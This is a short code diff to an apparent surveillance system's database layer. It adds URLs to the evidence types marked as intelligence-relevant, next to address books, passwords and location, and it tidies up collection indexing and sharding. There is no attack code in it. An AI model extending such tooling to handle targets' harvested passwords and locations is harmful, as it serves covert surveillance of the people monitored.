@@ -114,7 +114,7 @@ class Evidence
   end
 
   def intelligence_relevant?
-    %w[addressbook password position].include?(type)
+    %w[addressbook password position url].include?(type)
   end
 
   def enqueue
@@ -158,13 +158,10 @@ class Evidence
   end
 
   def self.create_collection
-    # create the collection for the target's evidence and shard it
-    db = RCS::DB::DB.instance.mongo_connection
-    collection = db.collection self.collection.name
     # ensure indexes
-    self.create_indexes
+    create_indexes
     # enable sharding only if not enabled
-    RCS::DB::Shard.set_key(collection, {type: 1, da: 1, aid: 1}) unless collection.stats['sharded']
+    RCS::DB::Shard.set_key(collection, {type: 1, da: 1, aid: 1}) unless RCS::DB::Shard.sharded?(collection)
   end
 
   # Count the number of all the evidences grouped by type.
